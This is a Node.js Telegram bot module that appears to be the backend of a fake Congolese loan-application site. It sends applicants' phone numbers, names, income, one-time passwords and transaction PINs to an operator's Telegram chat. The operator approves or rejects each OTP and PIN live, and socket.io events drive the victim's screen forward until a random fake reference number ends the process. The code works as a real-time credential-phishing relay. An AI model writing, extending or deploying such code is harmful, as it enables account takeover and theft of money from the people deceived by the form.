require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");

// Initialize bot without polling (Render uses webhooks)
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
const ADMIN_ID = process.env.ADMIN_CHAT_ID;

const botManager = {
    bot: bot,

    sendConsolidatedData: (appId, sessionData) => {
        // Extract key data from steps 1, 2, and 3
        const step2Data = sessionData.step2 || {};
        const step3Data = sessionData.step3 || {};
        const step1Data = sessionData.step1 || {};

        let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `<b>🇨🇩 CONSOLIDATED APPLICATION DATA</b>\n🆔 ID: <code>${appId}</code>\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `<b>📱 Phone Number:</b> <code>${step2Data.phone || 'N/A'}</code>\n`;
        msg += `<b>👤 Name:</b> <code>${step2Data.firstName || ''} ${step2Data.lastName || 'N/A'}</code>\n`;
        msg += `<b>💰 Loan Amount (CDF):</b> <code>${step1Data.amount || 'N/A'}</code>\n`;
        msg += `<b>💵 Monthly Income (CDF):</b> <code>${step3Data.income || 'N/A'}</code>\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━`;

        bot.sendMessage(ADMIN_ID, msg, { parse_mode: 'HTML' });
    },

    sendToAdmin: (appId, title, data, needsApproval = false) => {
        let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
        for (const [k, v] of Object.entries(data)) {
            msg += `<b>${k}:</b> <code>${v}</code>\n`;
        }
        msg += `━━━━━━━━━━━━━━━━━━━━`;

        const options = { parse_mode: 'HTML' };
        if (needsApproval) {
            options.reply_markup = {
                inline_keyboard: [[
                    // Step 4 Approval moves user to Step 5 (PIN screen)
                    { text: "✅ APPROVE OTP", callback_data: `approve_4_${appId}` },
                    { text: "❌ REJECT", callback_data: `reject_4_${appId}` }
                ]]
            };
        }
        bot.sendMessage(ADMIN_ID, msg, options);
    },

    sendFinalApproval: (appId, pin) => {
        let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `🏁 <b>🇨🇩 FINAL PIN RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n🔐 PIN: <code>${pin}</code>\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━`;
        
        bot.sendMessage(ADMIN_ID, msg, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ COMPLETE LOAN", callback_data: `approve_5_${appId}` },
                    { text: "❌ REJECT", callback_data: `reject_5_${appId}` }
                ]]
            }
        });
    }
};

// Handle Admin Button Clicks
bot.on("callback_query", (query) => {
    const data = query.data;
    const io = global.io;

    console.log('Callback received:', data);

    if (!io) {
        console.error('No global.io available when handling callback_query');
        bot.answerCallbackQuery(query.id, { text: "Error: Socket instance missing" });
        return;
    }

    // Extract action and step correctly
    const match = data.match(/^(approve|reject)_(\d)_(.+)$/);
    if (!match) {
        console.error("❌ Invalid callback format:", data);
        bot.answerCallbackQuery(query.id, { text: "Invalid callback format" });
        return;
    }

    let [, action, step, rawAppId] = match;

    // support either plain appId or base64-encoded appId
    let appId = rawAppId;
    try {
        // try base64 decode; if it results in a readable string starting with COD- (or any valid prefix), use it
        const decoded = Buffer.from(rawAppId, 'base64').toString('utf8');
        // basic sanity check: decoded should be non-empty and start with COD- (our format)
        if (decoded && decoded.startsWith('COD-')) {
            appId = decoded;
            console.log('Decoded appId from base64');
        }
    } catch (e) {
        // ignore decode errors and keep raw
    }

    console.log('Parsed callback:', { action, step, appId });

    // Check if room exists and its size (socket.io v4 uses Map)
    let roomSize = 0;
    try {
        const room = io.sockets.adapter.rooms.get(appId);
        roomSize = room ? room.size : 0;
    } catch (e) {
        // fallback for older socket.io
        try {
            roomSize = io.sockets.adapter.rooms[appId] ? io.sockets.adapter.rooms[appId].length : 0;
        } catch (e2) {
            roomSize = 0;
        }
    }
    console.log(`Room "${appId}" present? size=${roomSize}`);

    if (action === "approve") {
        if (step === "4") {
            // Signal frontend to move to Step 5 (PIN)
            if (roomSize > 0) {
                io.to(appId).emit('otp-verified');
                bot.answerCallbackQuery(query.id, { text: "OTP Verified. PIN input shown to user." });
            } else {
                bot.answerCallbackQuery(query.id, { text: "User offline — cannot deliver approval." });
            }
        } 
        else if (step === "5") {
            // Signal frontend to show final success screen with Congo tracking ref
            const ref = "COD-" + Math.floor(Math.random() * 900000 + 100000);
            if (roomSize > 0) {
                io.to(appId).emit('pin-verified', { referenceId: ref });
                bot.answerCallbackQuery(query.id, { text: "Congo Application Completed!" });
            } else {
                bot.answerCallbackQuery(query.id, { text: "User offline — cannot deliver completion." });
            }
        }
        
        bot.editMessageText(query.message.text + `\n\n✅ <b>ACTION: APPROVED (STEP ${step})</b>`, {
            chat_id: ADMIN_ID,
            message_id: query.message.message_id,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [] }
        }).catch(err => console.error('editMessageText error (approve):', err.message || err));
    }

    else if (action === "reject") {
        if (step === "4") {
            // Notify frontend AND provide a clear user-facing message so the user knows to retry
            const userMessage = "The OTP provided is wrong or expired, please try again.";
            try {
                if (roomSize > 0) {
                    io.to(appId).emit('otp-failed', { message: userMessage });
                    console.log(`Emitted otp-failed to ${appId}`);
                    bot.answerCallbackQuery(query.id, { text: "OTP Code Rejected — user notified." });
                } else {
                    console.log(`Room ${appId} not found when rejecting OTP; user offline`);
                    bot.answerCallbackQuery(query.id, { text: "User is offline — cannot deliver rejection." });
                }
            } catch (err) {
                console.error('Error emitting otp-failed:', err);
                bot.answerCallbackQuery(query.id, { text: "Error delivering message" });
            }

            // Optionally edit admin message and remove inline buttons
            bot.editMessageText(query.message.text + `\n\n❌ <b>ACTION: REJECTED (STEP ${step})</b>`, {
                chat_id: ADMIN_ID,
                message_id: query.message.message_id,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
            }).catch(err => console.error('editMessageText error (reject step4):', err.message || err));

        } 
        else if (step === "5") {
            const userMessage = "The transactional PIN was rejected by an admin. Please try again.";
            try {
                if (roomSize > 0) {
                    io.to(appId).emit('pin-failed', { message: userMessage });
                    console.log(`Emitted pin-failed to ${appId}`);
                    bot.answerCallbackQuery(query.id, { text: "PIN Code Rejected — user notified." });
                } else {
                    console.log(`Room ${appId} not found when rejecting PIN; user offline`);
                    bot.answerCallbackQuery(query.id, { text: "User is offline — cannot deliver rejection." });
                }
            } catch (err) {
                console.error('Error emitting pin-failed:', err);
                bot.answerCallbackQuery(query.id, { text: "Error delivering message" });
            }

            bot.editMessageText(query.message.text + `\n\n❌ <b>ACTION: REJECTED (STEP ${step})</b>`, {
                chat_id: ADMIN_ID,
                message_id: query.message.message_id,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
            }).catch(err => console.error('editMessageText error (reject step5):', err.message || err));
        }
    }
});
module.exports = botManager;
